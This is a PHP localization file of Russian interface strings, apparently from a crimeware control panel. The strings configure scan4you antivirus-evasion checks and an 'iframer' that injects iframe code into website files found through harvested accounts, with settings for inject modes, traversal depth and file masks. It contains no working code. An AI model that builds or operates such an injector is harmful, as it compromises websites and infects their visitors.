<?php
define('AJAX_CONFIG_JABBER_ID',				'Jabber для уведомлений (через запятую)');
define('AJAX_CONFIG_SCAN4YOU_ID',				'ID профиля  (scan4you)');
define('AJAX_CONFIG_SCAN4YOU_TOKEN',			'API Token  (scan4you)');

define('AJAX_CONFIG_SCAN4YOU_HINT',			'Чтобы получить ID & Token, зарегестрируйтесь на сайте <a href="http://scan4you.net/" target="_blank">scan4you.net</a>, потом зайдите на страницу "Профиль"');

define('AJAX_CONFIG_IFRAMER_URL',										'URL скрипта iframer');
define('AJAX_CONFIG_IFRAMER_HTML',										'HTML код iframe');
define('AJAX_CONFIG_IFRAMER_MODE',										'Режим действия');
define('AJAX_CONFIG_IFRAMER_MODE_OFF',									'Выключен');
define('AJAX_CONFIG_IFRAMER_MODE_CHECKONLY',							'Только проверка');
define('AJAX_CONFIG_IFRAMER_MODE_INJECT',								'Инжект');
define('AJAX_CONFIG_IFRAMER_MODE_PREVIEW',								'Предпросмотр (сохраняет в существующую "iframed/")');
define('AJAX_CONFIG_IFRAMER_INJECT',									'Метод инжекта');
define('AJAX_CONFIG_IFRAMER_INJECT_SMART',								'Умный');
define('AJAX_CONFIG_IFRAMER_INJECT_APPEND',								'Дописать в конец');
define('AJAX_CONFIG_IFRAMER_INJECT_OVERWRITE',							'Перезаписать');
define('AJAX_CONFIG_IFRAMER_TRAV_DEPTH',								'Глубина обхода');
define('AJAX_CONFIG_IFRAMER_TRAV_DIR_MSK',								'Маски директорий (по одной на строке)');
define('AJAX_CONFIG_IFRAMER_TRAV_FILE_MSK',								'Маски файлов (по одной на строке)');
define('AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS',							'Повторная обработка через N дней');
define('AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS_HINT',					'Обрабатывать аккаунты заново каждые N дней. 0 - отключить');
define('AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS',					'Задержка обработки, часов');
define('AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS_HINT',				'Найденный аккаунт "отлёживается" N часов и, если он не был включён в игнор-лист — отправляется на обработку');

define('AJAX_CONFIG_NAMED_PRESETS',										'Именованные наборы');
